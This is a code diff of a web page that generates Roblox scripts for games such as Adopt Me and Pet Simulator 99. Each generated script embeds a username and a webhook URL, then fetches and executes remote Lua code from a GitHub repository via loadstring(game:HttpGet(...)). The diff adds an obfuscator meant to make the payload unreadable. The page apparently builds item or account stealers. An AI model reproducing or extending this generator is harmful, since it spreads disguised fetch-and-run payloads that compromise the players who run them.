@@ -47,37 +47,11 @@
             background: #ff0055;
             transform: scale(1.1);
         }
-        #generated-script {
-            display: none;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
-            text-align: center;
-            margin-top: 20px;
-            max-width: 80%;
-            width: 100%;
-        }
-        textarea {
-            width: 100%;
-            height: 100px;
-            background: #222;
-            color: white;
-            border: none;
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 1rem;
-            resize: none;
-        }
-        label {
-            font-size: 1rem;
-            margin-top: 10px;
-        }
     </style>
 </head>
 <body>
     <h1>Script Generator</h1>
-    <div id="login-container" class="container">
+    <div class="container">
         <input type="text" id="username" placeholder="Enter your Username">
         <input type="text" id="webhook" placeholder="Enter Webhook URL">
         <select id="script-select">
@@ -90,11 +64,6 @@
         <label><input type="checkbox" id="obfuscate-option"> Enable Obfuscation</label>
         <button onclick="generateScript()">Generate Script</button>
     </div>
-    <div id="generated-script" class="container">
-        <h2>Your Script</h2>
-        <textarea id="script-output" readonly></textarea>
-        <button onclick="copyScript()">Copy All</button>
-    </div>
     <script>
         let loadstrings = {
             "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
@@ -102,10 +71,15 @@
             "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/AdoptMe'))()",
             "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Ps99'))()",
             "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
-        };function textToHex(str) {
-        return str.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+        };function obfuscateScript(script) {
+        let encoded = btoa(script).split('').reverse().join('');
+        let shuffled = encoded.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) + (i % 10))).join('');
+        let junk = Array(50).fill().map(() => String.fromCharCode(Math.random() * 26 + 65)).join('');
+        let garbage = `\n--[[ UNREADABLE CHAOS ENABLED ]]\n${junk}\n`;
+        let unpacker = `local a='${shuffled}';local b='';for i=#a,1,-1 do b=b..string.char(a:byte(i)-(i%10)) end;loadstring(b)()`;
+        return garbage + unpacker;
     }
-
+    
     function generateScript() {
         let username = document.getElementById('username').value;
         let webhook = document.getElementById('webhook').value;
@@ -122,41 +96,20 @@
 Webhook = "${webhook}" ${loadstrings[selectedScript]}`;
 
 if (obfuscate) {
-            let hexEncodedScript = textToHex(script);
-            script = `local hex = "${hexEncodedScript}"
-
-local decoded = "" for i=1, #hex-1, 2 do decoded = decoded .. string.char(tonumber(hex:sub(i, i+1), 16)) end loadstring(decoded)()`; }
-
-document.getElementById('script-output').value = script;
-        document.getElementById('generated-script').style.display = 'block';
-        document.getElementById('login-container').style.display = 'none';
-        sendToWebhook(webhook, script);
+            script = obfuscateScript(script);
+        }
+        
+        downloadScript(script);
     }
 
-    function copyScript() {
-        let scriptText = document.getElementById('script-output');
-        scriptText.select();
-        document.execCommand("copy");
-        alert("Script copied to clipboard!");
-    }
-
-    function sendToWebhook(webhook, scriptContent) {
-        let file = new Blob([scriptContent], { type: 'text/plain' });
-        let formData = new FormData();
-        formData.append("file", file, "script.txt");
-
-        fetch(webhook, {
-            method: "POST",
-            body: formData
-        }).then(response => {
-            if (response.ok) {
-                alert("Script sent successfully!");
-            } else {
-                alert("Failed to send script to webhook.");
-            }
-        }).catch(error => {
-            alert("Error sending script: " + error);
-        });
+    function downloadScript(content) {
+        let blob = new Blob([content], { type: "text/plain" });
+        let a = document.createElement("a");
+        a.href = URL.createObjectURL(blob);
+        a.download = "generated_script.txt";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
     }
 </script>
 
